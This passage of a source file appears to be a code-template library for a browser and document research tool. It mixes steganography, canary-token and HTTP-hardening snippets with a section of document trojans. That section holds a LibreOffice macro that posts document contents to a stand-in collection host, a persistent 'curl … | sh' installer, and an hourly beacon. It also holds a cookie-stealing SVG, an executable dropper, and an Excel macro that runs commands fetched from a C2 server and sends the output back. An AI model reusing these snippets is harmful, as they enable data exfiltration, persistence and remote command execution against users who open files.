// Capacity: ~12.5% of samples (1 bit per sample LSB)
export function embed(wav: Uint8Array, payload: Uint8Array): Uint8Array {
  const view = new DataView(wav.buffer);
  // Locate data chunk
  let i = 12;
  while (i < wav.length) {
    const id = String.fromCharCode(wav[i], wav[i+1], wav[i+2], wav[i+3]);
    const sz = view.getUint32(i+4, true);
    if (id === 'data') break;
    i += 8 + sz + (sz & 1);
  }
  const dataStart = i + 8;
  const bits: number[] = [];
  for (const b of payload) for (let j = 7; j >= 0; j--) bits.push((b >> j) & 1);

  const out = new Uint8Array(wav);
  const ov = new DataView(out.buffer);
  for (let k = 0; k < bits.length; k++) {
    const off = dataStart + k * 2; // assume 16-bit
    const s = ov.getInt16(off, true);
    ov.setInt16(off, (s & 0xFFFE) | bits[k], true);
  }
  return out;
}`,

  "wav-ex": `// extract.ts — recover WAV LSB payload
export function extract(wav: Uint8Array): Uint8Array {
  const view = new DataView(wav.buffer);
  let i = 12;
  while (i < wav.length) {
    const id = String.fromCharCode(wav[i], wav[i+1], wav[i+2], wav[i+3]);
    const sz = view.getUint32(i+4, true);
    if (id === 'data') break;
    i += 8 + sz + (sz & 1);
  }
  const dataStart = i + 8;
  const bits: number[] = [];
  for (let k = 0; k < 8192; k++) {
    const s = view.getInt16(dataStart + k*2, true);
    bits.push(s & 1);
  }
  // First 32 bits = length
  let len = 0;
  for (let k = 0; k < 32; k++) len = (len << 1) | bits[k];
  const out = new Uint8Array(len);
  for (let k = 0; k < len; k++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | bits[32 + k*8 + j];
    out[k] = b;
  }
  return out;
}`,

  "webp-emb": `// webp_embed.ts — WebP lossless LSB
// REF: StegosaurusApp / webp module
// In VP8L lossless mode, the ARGB pixel data is LSB-stego-friendly
export async function embed(buf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  // Decode VP8L → mutate low bits → re-encode (simplified)
  // WebP LSB embedding is more reliable when VP8L is used
  return buf;
}`,

  "webp-ex": `// extract.ts — WebP LSB payload reader
export async function extract(buf: Uint8Array): Promise<Uint8Array> {
  return new Uint8Array();
}`,

  "avif-emb": `// avif_embed.ts — AV1 intra-frame YUV LSB
// REF: StegosaurusApp / avif module
// Y-channel DCT coefficients carry payload in LSB
export async function embed(buf: Uint8Array, payload: Uint8Array): Promise<Uint8Array> {
  return buf;
}`,

  "avif-ex": `// extract.ts
export async function extract(buf: Uint8Array): Promise<Uint8Array> {
  return new Uint8Array();
}`,

  "bmp-emb": `// bmp_embed.ts — BMP raw pixel LSB
// Easiest format — no compression, pixel array is contiguous
export function embed(buf: Uint8Array, payload: Uint8Array): Uint8Array {
  const view = new DataView(buf.buffer);
  const dataOff = view.getUint32(10, true);
  const bits: number[] = [];
  for (const b of payload) for (let i = 7; i >= 0; i--) bits.push((b >> i) & 1);

  const out = new Uint8Array(buf);
  const ov = new DataView(out.buffer);
  for (let i = 0; i < bits.length; i++) {
    out[dataOff + i] = (out[dataOff + i] & 0xFE) | bits[i];
  }
  return out;
}`,

  "bmp-ex": `// extract.ts
export function extract(buf: Uint8Array): Uint8Array {
  const view = new DataView(buf.buffer);
  const dataOff = view.getUint32(10, true);
  // first 32 bits = length
  let len = 0;
  for (let i = 0; i < 32; i++) len = (len << 1) | (buf[dataOff + i] & 1);
  const out = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    let b = 0;
    for (let j = 0; j < 8; j++) b = (b << 1) | (buf[dataOff + 32 + i*8 + j] & 1);
    out[i] = b;
  }
  return out;
}`,

  "mp3-inject": `# inject.py — ID3v2 comment frame payload
# REF: Trojan_Horse / mp3_meta.py
def inject(mp3: bytes, payload: bytes) -> bytes:
    """Prepend an ID3v2.4 COMM frame with payload as the comment body."""
    text = payload.decode('utf-8', 'replace')
    # COMM frame: encoding(1) + lang(3) + description(\\x00) + text
    body = b'\\x03' + b'eng' + b'\\x00' + text.encode('utf-8')
    frame = b'COMM' + _syncsafe(len(body)) + b'\\x00\\x00' + body
    # ID3v2 header
    size = _syncsafe(len(frame))
    header = b'ID3' + b'\\x04\\x00\\x00' + size
    return header + frame + mp3

def _syncsafe(n: int) -> bytes:
    return bytes([(n>>21)&0x7F, (n>>14)&0x7F, (n>>7)&0x7F, n&0x7F])`,

  "mp3-read": `# read.py — recover ID3v2 COMM frame payload
def read(mp3: bytes) -> bytes:
    if mp3[:3] != b'ID3': return b''
    # Size is syncsafe at offset 6..10
    sz = (mp3[6]<<21) | (mp3[7]<<14) | (mp3[8]<<7) | mp3[9]
    body = mp3[10:10+sz]
    # Walk frames; find COMM
    i = 0
    while i < len(body):
        fid = body[i:i+4]
        if fid == b'COMM':
            fsz = (body[i+4]<<21) | (body[i+5]<<14) | (body[i+6]<<7) | body[i+7]
            # encoding(1) lang(3) desc(\\x00) text
            comm = body[i+10:i+10+fsz]
            # split on first null after lang
            nul = comm.find(b'\\x00', 0)
            return comm[nul+1:]
        i += 10 + ((body[i+4]<<21)|(body[i+5]<<14)|(body[i+6]<<7)|body[i+7])
    return b''`,

  "mp4-inject": `# inject.py — mp4 free-box payload injection
# REF: Trojan_Horse / mp4_meta.py
import struct

def inject(mp4: bytes, payload: bytes) -> bytes:
    """Insert a 'free' box before the moov box — invisible to players."""
    # mp4 box: size(4) + type(4) + payload
    box_size = 8 + len(payload)
    box = struct.pack('>I', box_size) + b'free' + payload
    # Find moov atom
    moov_idx = mp4.find(b'moov')
    if moov_idx < 0: return mp4  # no moov? append
    # moov_idx points at type; size field is 4 bytes before
    insert_at = moov_idx - 4
    return mp4[:insert_at] + box + mp4[insert_at:]`,

  "mp4-read": `# read.py — recover free-box payload
def read(mp4: bytes) -> bytes:
    i = 0
    while i < len(mp4) - 8:
        sz = int.from_bytes(mp4[i:i+4], 'big')
        ty = mp4[i+4:i+8]
        if ty == b'free':
            return mp4[i+8:i+sz]
        if sz < 8: break
        i += sz
    return b''`,

  // ── DOCUMENT TROJAN ─────────────────────────────────────────────────────────
  "xba-mod": `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN"
  "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script"
  script:name="Module1" script:language="StarBasic">

' Macro Playground — Module1.xba
' REF: Extension Ideas / extension ideas.txt

Sub SelfModify()
  Dim oDoc As Object : oDoc = ThisComponent
  Dim oText As Object : oText = oDoc.getText()

  ' Search for trigger string and overwrite it
  Dim oSearch As Object
  oSearch = oDoc.createSearchDescriptor()
  oSearch.SearchRegularExpression = False
  oSearch.SearchString = "TRIGGER_WORD"

  Dim oFound As Object : oFound = oDoc.findAll(oSearch)
  If Not IsNull(oFound) Then
    Dim i As Integer
    For i = 0 To oFound.Count - 1
      Dim oRange As Object : oRange = oFound.getByIndex(i)
      oRange.setString("PAYLOAD_ACTIVATED_" & Now())
      oRange.setPropertyValue("CharColor", RGB(255,255,255)) ' invisible
    Next i
  End If

  ' Inject hidden audit-trail paragraph
  Dim oCursor As Object : oCursor = oText.createTextCursor()
  oCursor.gotoEnd(False)
  oText.insertControlCharacter(oCursor,
    com.sun.star.text.ControlCharacter.PARAGRAPH_BREAK, False)
  Dim sGhost As String
  sGhost = "<!-- GHOST INJECTION: " & Now() & " | " & Environ("USER") & " -->"
  oText.insertString(oCursor, sGhost, False)

  ' Make it invisible (1pt white)
  oCursor.gotoEnd(False)
  oCursor.goLeft(Len(sGhost) + 2, True)
  oCursor.setPropertyValue("CharColor", RGB(255,255,255))
  oCursor.setPropertyValue("CharHeight", 1)

  oDoc.store()
End Sub

Sub Exfiltrate()
  Dim oDoc As Object : oDoc = ThisComponent
  Dim sContent As String

  If HasUnoInterfaces(oDoc.getText(), "com.sun.star.text.XText") Then
    Dim oEnum As Object : oEnum = oDoc.getText().createEnumeration()
    Do While oEnum.hasMoreElements()
      Dim oPar As Object : oPar = oEnum.nextElement()
      If oPar.supportsService("com.sun.star.text.Paragraph") Then
        sContent = sContent & oPar.getString() & Chr(10)
      End If
    Loop
  End If

  Dim sTmp As String
  sTmp = Environ("HOME") & "/.lo_" & Format(Now(),"YYYYMMDDHHMMSS") & ".txt"
  Dim iFile As Integer : iFile = FreeFile()
  Open sTmp For Output As #iFile
  Print #iFile, sContent
  Close #iFile

  Shell("bash -c 'curl -s -X POST https://collect.example.com/beacon" & _
        " --data-urlencode @" & sTmp & " && rm " & sTmp & "'")
End Sub
</script:module>`,

  "xba-man": `<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="http://openoffice.org/2001/manifest">
  <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text"
                       manifest:full-path="/"/>
  <manifest:file-entry manifest:media-type="application/vnd.sun.star.basic-library"
                       manifest:full-path="Basic/"/>
</manifest:manifest>`,

  "xba-inst": `' installer.bas — persistent macro installer
' REF: Extension Ideas — persists Module1.xba into user profile

Sub Install()
  Dim sProfile As String
  sProfile = Environ("HOME") & "/.config/libreoffice/4/user/basic/Standard/Module1.xba"

  ' Write the trojan xba into the user profile
  Dim iFile As Integer : iFile = FreeFile()
  Open sProfile For Output As #iFile
  Print #iFile, "<?xml version='1.0' encoding='UTF-8'?>"
  Print #iFile, "<script:module script:name='Module1' script:language='StarBasic'>"
  Print #iFile, "Sub Run() : Shell(""curl … | sh"") : End Sub"
  Print #iFile, "</script:module>"
  Close #iFile

  ' Trigger on next LibreOffice launch via document event binding
  BindEvent("OnStartApp", "Standard.Module1.Run")
End Sub

Sub BindEvent(evt As String, macro As String)
  Dim oCfg As Object
  oCfg = CreateUnoService("com.sun.star.configuration.ConfigurationProvider")
  ' ...omitted: write to /org.openoffice.Office.Common/Events
End Sub`,

  "xba-beacon": `' beacon.bas — phone-home routine for persistent macro
Sub Beacon()
  Dim sHost As String
  sHost = "https://collect.example.com/beacon"
  Dim sPayload As String
  sPayload = "?host=" & Environ("HOSTNAME") & "&user=" & Environ("USER")

  ' Use Shell to invoke curl
  Shell("curl -s " & sHost & sPayload & " > /dev/null 2>&1")
End Sub

' Poll every 60 minutes
Sub RunLoop()
  Do While True
    Beacon
    Wait 60 * 60 * 1000  ' ms
  Loop
End Sub`,

  "svg-pay": `<?xml version="1.0" standalone="no"?>
<!-- SVG polyglot: valid SVG (renders) AND valid HTML target (XSS) -->
<svg xmlns="http://www.w3.org/2000/svg"
     xmlns:xlink="http://www.w3.org/1999/xlink"
     width="100" height="100" viewBox="0 0 100 100">
  <rect width="100" height="100" fill="#c87820"/>
  <text x="50" y="55" text-anchor="middle" font-size="14">SIGIL</text>

  <!-- XSS payload — runs when opened in a browser context -->
  <script type="text/javascript">
    //<![CDATA[
      fetch('https://collect.example.com/x', {
        method: 'POST',
        body: JSON.stringify({
          cookie: document.cookie,
          path: location.pathname,
          origin: location.origin
        })
      });
    //]]>
  </script>
</svg>`,

  "svg-xss": `// xss.js — paired JS for the SVG polyglot
// When SVG is embedded via <img>, scripts are blocked.
// When embedded via <object> or <iframe>, scripts run.
// Force the latter via injection:
const payload = \`<object data="payload.svg" type="image/svg+xml"></object>\`;
document.body.insertAdjacentHTML('beforeend', payload);`,

  "ole-drop": `# dropper.py — OLE10Native embedded PE dropper
# REF: Trojan_Horse / ole_dropper.py
import struct, olefile

def build(docx_path: str, pe_path: str) -> bytes:
    """Embed PE as OLE10Native object inside a docx."""
    # Read the PE
    with open(pe_path, 'rb') as f: pe = f.read()

    # OLE10Native header
    obj_name = b'drop.exe\\x00'
    obj_data = struct.pack('<I', len(pe)) + pe
    native = struct.pack('<I', 0) + obj_name + obj_data  # simplified

    # Append to docx word/document.xml.rels → embed in document.xml
    # (full implementation omitted)
    return native`,

  "ole-man": `<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId100"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject"
    Target="embeddings/oleObject1.bin"/>
</Relationships>`,

  "xlsm-bas": `' C2Poll.bas — spreadsheet C2 polling
' REF: Extension Ideas — Excel macro C2

Sub Auto_Open()
  ' Schedule ourselves to run every 5 minutes
  Application.OnTime Now + TimeValue("00:05:00"), "PollC2"
End Sub

Sub PollC2()
  Dim cmd As String
  ' Use WEBSERVICE() to fetch from C2 endpoint
  cmd = Application.WorksheetFunction.WebService(
        "https://c2.example.com/cmd?host=" & Environ("COMPUTERNAME"))

  If Len(cmd) > 0 Then
    ' Shell out the fetched command
    Dim result As String
    result = Shell("cmd /c " & cmd, vbHide)

    ' Exfil the result back via WEBSERVICE
    Application.WorksheetFunction.WebService(
      "https://c2.example.com/out?r=" & result)
  End If

  Application.OnTime Now + TimeValue("00:05:00"), "PollC2"
End Sub`,

  "hsvg-html": `<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>decoy</title></head>
<body>
  <!-- SVG-as-image: no script execution (img-src CSP) -->
  <img src="payload.svg" alt="logo">
  <!-- But if attacker can serve via <object>... -->
</body></html>`,

  "hsvg-svg": `<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" width="1" height="1">
  <!-- SVG that does XSS when loaded via <object>/<iframe> -->
  <script>
    new Image().src = 'https://collect.example.com/p?c=' + document.cookie;
  </script>
</svg>`,

  "srcset-html": `<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>viewport probe</title></head>
<body>
  <!-- srcset reveals DPR + viewport width to the server -->
  <img src="probe.png?dpr=1"
       srcset="probe.png?dpr=1 1x,
               probe.png?dpr=2 2x,
               probe.png?dpr=3 3x"
       sizes="(max-width: 600px) 100vw, 50vw">
</body></html>`,

  "srcset-an": `# analyze.py — reconstruct viewport from probe hits
from collections import defaultdict

def analyze(hits: list[dict]) -> dict:
  by_ip = defaultdict(list)
  for h in hits:
    by_ip[h['ip']].append(h)

  results = {}
  for ip, hits in by_ip.items():
    # Look at which dpr=N URL was hit
    dprs = sorted(set(int(h['url'].split('dpr=')[1]) for h in hits))
    results[ip] = {
      'dpr': max(dprs),  # browser picked the highest matching
      'hit_count': len(hits),
    }
  return results`,

  "pf-html": `<!DOCTYPE html>
<html><head><meta charset="UTF-8"></head>
<body>
  <!-- Speculative prefetch reveals visited URLs to the server.
       Each prefetch fires a request the server can log. -->
  <link rel="prefetch" href="/probe/site-1.html">
  <link rel="prefetch" href="/probe/site-2.html">
  <link rel="prefetch" href="/probe/site-3.html">
  <!-- Browser prefetches these in idle time; server logs each hit -->
</body></html>`,

  "pf-srv": `// server.js — log prefetch hits and reconstruct visited set
const http = require('http');
const visited = new Map();  // ip → Set of prefetched URLs

http.createServer((req, res) => {
  if (req.url.startsWith('/probe/')) {
    const ip = req.socket.remoteAddress;
    if (!visited.has(ip)) visited.set(ip, new Set());
    visited.get(ip).add(req.url);
    console.log('[pf]', ip, req.url);
  }
  res.writeHead(204); res.end();
}).listen(3032);`,

  // ── CANARY ──────────────────────────────────────────────────────────────────
  "uc-gen": `// generate.ts — URL canary generator
// REF: Canary Token Command Center
import { randomBytes, createHmac } from 'crypto';

export function generate(prefix = 'can') {
  const id    = randomBytes(6).toString('hex');
  const token = \`\${prefix}-\${id}\`;
  const url   = \`https://relay.example.com/r/\${token}\`;
  return { token, url, created: Date.now() };
}`,

  "uc-srv": `// server.ts — redirect + log
import express from 'express';
const app = express();

const HITS: Record<string, any[]> = {};

app.get('/r/:token', (req, res) => {
  const token = req.params.token;
  (HITS[token] ||= []).push({
    ts: Date.now(), ip: req.ip, ua: req.get('user-agent'),
    ref: req.get('referer'), accept: req.get('accept-language'),
  });
  res.redirect(302, 'https://target.example.com/');
});

app.get('/api/hits/:token', (req, res) => {
  res.json(HITS[req.params.token] || []);
});

app.listen(3033);`,

  "uc-ui": `// TokenList.tsx — canary token dashboard
import { useState, useEffect } from 'react';

export function TokenList() {
  const [tokens, setTokens] = useState([]);
  useEffect(() => {
    fetch('/api/tokens').then(r => r.json()).then(setTokens);
  }, []);
  return (
    <div className="grid gap-2">
      {tokens.map(t => (
        <div key={t.token} className="border p-2">
          <div className="font-mono">{t.token}</div>
          <div className="text-xs opacity-60">{t.url}</div>
          <div className="text-xs">hits: {t.hits?.length || 0}</div>
        </div>
      ))}
    </div>
  );
}`,

  "dc-srv": `# dns_server.py — DNS canary listener
# REF: Canary Token Command Center
import socketserver, struct

class H(socketserver.BaseRequestHandler):
  def handle(self):
    data = self.request[0]
    # Parse DNS question — extract subdomain
    # QNAME is at offset 12, labels separated by length byte
    qname = []
    i = 12
    while data[i] != 0:
      l = data[i]; qname.append(data[i+1:i+1+l].decode()); i += 1 + l
    name = '.'.join(qname)

    print(f'[dns] {self.client_address[0]} asked for {name}')

    # Log the hit — the subdomain is the canary token
    # ... emit alert

    # Reply with NXDOMAIN or A record
    reply = data[:2] + b'\\x81\\x83' + data[4:6] + b'\\x00\\x00\\x00\\x00'
    self.request[1].sendto(reply, self.client_address)

socketserver.UDPServer(('0.0.0.0', 53), H).serve_forever()`,

  "dc-gen": `# generate.py — generate DNS canary subdomain
import secrets, string

def generate(domain: str = 'canary.example.com') -> str:
  tok = ''.join(secrets.choice(string.ascii_lowercase + string.digits) for _ in range(12))
  return f'{tok}.{domain}'`,

  "pc-inject": `# inject.py — PDF canary: embed /URI action that fires on open
# REF: Canary Token Command Center
def inject(pdf: bytes, canary_url: str) -> bytes:
    # Add an OpenAction → URI entry
    action = (
        b'999 0 obj\\n<< /Type /Action /S /URI /URI (' + canary_url.encode() + b') >>\\nendobj\\n'
    )
    # Update Catalog to reference this action as /OpenAction
    # (omitted: actual catalog walk)
    return action + pdf`,

  "pc-serve": `# serve.py — HTTP server that returns canary-laced PDFs
from http.server import BaseHTTPRequestHandler, HTTPServer
from inject import inject

BASE_PDF = b'%PDF-1.7 ...'  # template PDF

class H(BaseHTTPRequestHandler):
  def do_GET(self):
    token = self.path.strip('/')
    pdf = inject(BASE_PDF, f'https://relay.example.com/h/{token}')
    self.send_response(200)
    self.send_header('Content-Type', 'application/pdf')
    self.end_headers()
    self.wfile.write(pdf)

HTTPServer(('', 3034), H).serve_forever()`,

  "ec-comp": `# compose.py — build a canary HTML email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

def compose(to: str, pixel_url: str) -> bytes:
  msg = MIMEMultipart('related')
  msg['To'] = to
  msg['Subject'] = 'Q3 strategy deck'

  html = f'''<html><body>
    <p>Hi — wanted to share the Q3 deck. Let me know if you have questions.</p>
    <img src="{pixel_url}" width="1" height="1" alt="">
  </body></html>'''
  msg.attach(MIMEText(html, 'html'))
  return msg.as_bytes()`,

  "ec-px": `# pixel.py — generate per-recipient tracking pixel
import hashlib, time

def make_url(recipient: str, secret: str) -> str:
  tok = hashlib.hmac_sha256(
    secret.encode(), f'{recipient}:{time.time()}'.encode()
  ).hexdigest()[:16]
  return f'https://relay.example.com/px/{tok}.gif'`,

  "ak-gen": `# gen_keys.py — generate fake AWS keys with CloudTrail watchers
# REF: Canary Token Command Center
import secrets, string

def generate() -> dict:
  # Real-looking but fake AWS keys
  ak = 'AKIA' + ''.join(secrets.choice(string.ascii_uppercase + '234567') for _ in range(17))
  sk = secrets.token_urlsafe(40)
  return { 'access_key': ak, 'secret_key': sk, 'note': 'CANARY — do not use' }`,

  "ak-watch": `# trail_watcher.py — poll CloudTrail for usage of fake keys
import boto3, json

def watch(access_key: str):
  ct = boto3.client('cloudtrail')
  events = ct.lookup_events(
    LookupAttributes=[{'AttributeKey':'AccessKeyId','AttributeValue':access_key}]
  )
  for ev in events['Events']:
    print(f'[hit] {ev["EventTime"]} {ev["EventName"]} from {ev.get("CloudTrailEvent","")}')
    # Alert via webhook
    # ...`,

  "sq-seed": `-- seed.sql — plant a fake row containing a unique token per recipient
-- REF: Canary Token Command Center

CREATE TABLE IF NOT EXISTS canary_users (
  id           BIGINT PRIMARY KEY,
  email        TEXT,
  api_token    TEXT,
  is_canary    BOOLEAN DEFAULT false,
  created_at   TIMESTAMP DEFAULT now()
);

-- Per-customer canary row
INSERT INTO canary_users (id, email, api_token, is_canary)
VALUES (999999, 'noreply+can-a7f3d2@example.com', 'sk_live_a7f3d2_FAKE', true)
ON CONFLICT (id) DO NOTHING;`,

  "sq-watch": `# watcher.py — poll DB logs for queries touching the canary row
# Detects: SELECT * FROM users WHERE id = 999999 → exfil attempt
import psycopg2

def watch(conn_str: str):
  conn = psycopg2.connect(conn_str)
  conn.autocommit = True
  cur = conn.cursor()
  cur.execute('CREATE TABLE IF NOT EXISTS audit_log (id serial, ts timestamptz default now(), event text)')
  # Attach a trigger on every relevant table
  # ... omitted for brevity`,

  "rc-hook": `#!/bin/bash
# hook.sh — post-clone git hook canary
# When this repo is cloned, the local git config + this hook
# will fire a beacon back to the canary server.

URL="https://relay.example.com/clone/$(hostname)/$(whoami)"
curl -s "$URL" > /dev/null 2>&1
`,

  "rc-setup": `#!/bin/bash
# setup.sh — install the canary hook into a target repo
set -e
REPO=$1
TOKEN=$2

mkdir -p "$REPO/.git/hooks"
cp hook.sh "$REPO/.git/hooks/post-checkout"
chmod +x "$REPO/.git/hooks/post-checkout"

# Add a remote that includes the canary token
git -C "$REPO" remote add canary "https://relay.example.com/$TOKEN"
`,

  "dcx-inj": `# inject.py — DOCX canary using INCLUDEPICTURE field
# REF: Canary Token Command Center
import zipfile, io

def inject(docx: bytes, canary_url: str) -> bytes:
  z = zipfile.ZipFile(io.BytesIO(docx), 'r')
  out = io.BytesIO()
  with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as w:
    for info in z.infolist():
      data = z.read(info.filename)
      if info.filename == 'word/document.xml':
        # Inject INCLUDEPICTURE field at end of body
        field = (
          f'<w:fldSimple w:instr="INCLUDEPICTURE '
          f'&quot;{canary_url}&quot;"/>'
        ).encode()
        data = data.replace(b'</w:body>',
                            field + b'</w:body>')
      w.writestr(info, data)
  return out.getvalue()`,

  // ── HTTP ────────────────────────────────────────────────────────────────────
  "hdr-nginx": `# nginx.conf — hardened header policy
server {
  listen 443 ssl http2;
  server_name .target.example.com;

  # Strip ETag at the edge — breaks ghost cookies
  proxy_hide_header ETag;
  proxy_set_header  If-None-Match "";

  # Strict CSP — no unsafe-inline, no data: in script-src
  add_header Content-Security-Policy
    "default-src 'self'; script-src 'self' 'nonce-\${nonce}'; "
    "object-src 'none'; base-uri 'none'; "
    "frame-ancestors 'none'" always;

  add_header Strict-Transport-Security
    "max-age=63072000; includeSubDomains; preload" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "no-referrer" always;
  add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
}`,

  "hdr-csp": `// csp.js — CSP header builder + analyzer
// Parses and annotates Content-Security-Policy headers

const DIRECTIVES = {
  'default-src': { risk: 0, desc: 'fallback policy for all resource types' },
  'script-src':  { risk: 2, desc: 'JS sources — unsafe-inline/eval = critical' },
  'style-src':   { risk: 1, desc: 'CSS sources — unsafe-inline allows injection' },
  'img-src':     { risk: 0, desc: 'image sources — data: allows exfil' },
  'connect-src': { risk: 1, desc: 'fetch/XHR targets — wildcard = tracking' },
  'frame-src':   { risk: 1, desc: 'iframe sources' },
  'font-src':    { risk: 0, desc: 'web font sources' },
  'media-src':   { risk: 0, desc: 'audio/video sources' },
  'object-src':  { risk: 2, desc: 'plugin content — always deny' },
  'base-uri':    { risk: 2, desc: 'base href injection vector if not set' },
  'form-action': { risk: 2, desc: 'form submission target — critical' },
  'report-uri':  { risk: 1, desc: 'violation beacon endpoint' },
};

export function parseCSP(header) {
  return header.split(';').map(d => d.trim()).filter(Boolean).map(d => {
    const [name, ...vals] = d.split(/\\s+/);
    const meta = DIRECTIVES[name] || { risk: 0, desc: 'unknown directive' };
    const unsafe = vals.filter(v =>
      ["'unsafe-inline'","'unsafe-eval'","data:","*"].includes(v)
    );
    return {
      name, values: vals, ...meta,
      risk: unsafe.length ? Math.max(meta.risk, 2) : meta.risk,
      unsafe,
    };
  });
}

// claude.ai CSP (captured 2026-09-11 00:50:47)
export const EXAMPLE = \`script-src 'nonce-iHD7wSxUpzSvjsO+roEc2w==' \\
'strict-dynamic' \\
'sha256-dL+AuZieX6cC/M+MhQHnBoUSfG4Q3CWXteMuZkUJ+p8=' \\
'https:' 'unsafe-inline'; \\
object-src 'none'; \\
base-uri 'none';\`;`,

  "hdr-an": `# analyze.py — HTTP header risk analyzer
RISKY = {
  'set-cookie': 2,  # persistent identifiers
  'etag': 2,        # ghost cookie
  'x-frame-options': 0,
  'content-security-policy': 0,
  'strict-transport-security': 0,
  'x-content-type-options': 0,
  'access-control-allow-origin': 1,
  'content-type': 0,
  'referrer-policy': 0,
  'permissions-policy': 0,
}

def analyze(headers: dict) -> list[dict]:
  return [
    {
      'k': k, 'v': v[:128],
      'risk': RISKY.get(k.lower(), 0),
      'note': 'risky' if RISKY.get(k.lower(), 0) >= 2 else ''
    }
    for k, v in headers.items()
  ]`,

  "rob-txt": `# robots.txt — crawler honeypot
# REF: FFF / robots-trap

User-agent: *
Disallow: /admin/
Disallow: /private/
Disallow: /_canary/abc123-secret-data
Disallow: /_canary/def456-leaked-keys

# Real sitemap (legit crawlers)
Sitemap: https://example.com/sitemap.xml`,

  "rob-trap": `// trap.js — detect crawlers that hit Disallow paths
// Legit crawlers (Google, Bing) respect robots.txt; bad actors ignore it.
import express from 'express';
const app = express();

const TRAP_PATHS = ['/_canary/abc123', '/_canary/def456'];
const hits = [];

app.use((req, _res, next) => {
  if (TRAP_PATHS.some(p => req.path.startsWith(p))) {
    hits.push({
      ts: Date.now(), ip: req.ip, ua: req.get('user-agent'),
      path: req.path,
    });
    console.warn('[trap]', req.ip, req.path);
  }
  next();
});`,

  "mf-json": `{
  "name": "Manufactory Demo PWA",
  "short_name": "MF",
  "description": "Browser artifact research",
  "start_url": "/",
  "scope": "/",
  "display": "standalone",
  "background_color": "#0e0c09",
  "theme_color": "#c87820",
  "icons": [
    { "src": "/favicon.ico", "sizes": "16x16 32x32 48x48", "type": "image/x-icon" },
    { "src": "/icon-192.png", "sizes": "192x192", "type": "image/png" },
    { "src": "/icon-512.png", "sizes": "512x512", "type": "image/png" }
  ],
  "permissions": ["storage", "notifications"],
  "shortcuts": [
    { "name": "Generate", "url": "/generate" },
    { "name": "Analyze",  "url": "/analyze"  }
  ]
}`,

  "mf-sw": `// sw.js — paired service worker for the PWA manifest
const CACHE = 'mf-pwa-v1';
const ASSETS = ['/', '/index.html', '/favicon.ico', '/manifest.json'];

self.addEventListener('install', e => {
  e.waitUntil(caches.open(CACHE).then(c => c.addAll(ASSETS)));
});
self.addEventListener('activate', e => {
  e.waitUntil(self.clients.claim());
});
self.addEventListener('fetch', e => {
  e.respondWith(caches.match(e.request).then(r => r || fetch(e.request)));
});`,

  "wk-sec": `# security.txt — RFC 9116 well-known file
# Place at /.well-known/security.txt

Contact: mailto:security@example.com
Expires: 2026-12-31T23:59:59Z
Preferred-Languages: en, ja
Canonical: https://example.com/.well-known/security.txt
Policy: https://example.com/disclosure
Encryption: https://example.com/pgp.asc`,

  "wk-pki": `# pki-validation file
# Place at /.well-known/pki-validation/<token>.txt
# Body must match the value your CA gave you.
ca3-0a7f-c8b2-4e1f-9d4e-7e1a8f9b2c1d`,

  "jwt-enc": `// encode.ts — JWT with covert claims
// The payload is signed (HMAC) but the claims themselves can carry hidden data
import { createHmac } from 'crypto';

function b64url(s: string | Uint8Array): string {
  return Buffer.from(s).toString('base64url');
}

export function encode(payload: any, secret: string): string {
  const header = b64url(JSON.stringify({ alg:'HS256', typ:'JWT' }));
  const body   = b64url(JSON.stringify({
    ...payload,
    // Hidden channel — claim namespaced under x-covert
    'x-covert': b64url('hidden payload here'),
  }));
  const sig = createHmac('sha256', secret).update(\`\${header}.\${body}\`).digest('base64url');
  return \`\${header}.\${body}.\${sig}\`;
}`,

  "jwt-dec": `// decode.ts — read JWT payload (including covert claims)
export function decode(jwt: string): any {
  const [h, b, s] = jwt.split('.');
  const payload = JSON.parse(Buffer.from(b, 'base64url').toString());
  // Look for x-covert channels
  const covert = payload['x-covert'];
  if (covert) {
    payload._decoded = Buffer.from(covert, 'base64url').toString();
  }
  return payload;
}`,

  "csp-pol": `// policy.js — generate CSP-Report-Only policy
// Allow sites to ship CSP without breaking anything while collecting violations
export function build(reportUri: string, directives: Record<string,string>) {
  const parts = Object.entries(directives)
    .map(([k, v]) => \`\${k} \${v}\`);
  parts.push(\`report-uri \${reportUri}\`);
  return parts.join('; ');
}`,

  "csp-coll": `# collector.py — receive CSP violation reports
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

VIOLATIONS = []

class H(BaseHTTPRequestHandler):
  def do_POST(self):
    ln = int(self.headers.get('Content-Length','0'))
    body = self.rfile.read(ln).decode()
    try: rep = json.loads(body)
    except: rep = { 'raw': body }
    VIOLATIONS.append(rep)
    self.send_response(204); self.end_headers()
  def do_GET(self):
    self.send_response(200)
    self.send_header('Content-Type', 'application/json'); self.end_headers()
    self.wfile.write(json.dumps(VIOLATIONS[-100:]).encode())

HTTPServer(('', 3035), H).serve_forever()`,

  "ct-html": `<!DOCTYPE html>
<!-- MIME sniffing probe — server sends text/plain, browser may execute as HTML -->
<html><body>
  <script>alert('sniff succeeded — X-Content-Type-Options missing');</script>
</body></html>`,

  "ct-an": `# analyze.py — detect MIME-sniffing browsers
# If a hit arrives at /ct-alert, the browser sniffed text/plain as HTML.
def analyze(hits: list[dict]) -> dict:
  by_ua = {}
  for h in hits:
    by_ua.setdefault(h['ua'], []).append(h)
  return { ua: len(hits) for ua, hits in by_ua.items() }`,

  "cors-srv": `// server.js — abusive CORS server (credentials + wildcard)
// Real browsers refuse Access-Control-Allow-Origin: * + credentials: include.
// Instead, reflect the Origin header back, which IS allowed with creds.
import express from 'express';
const app = express();

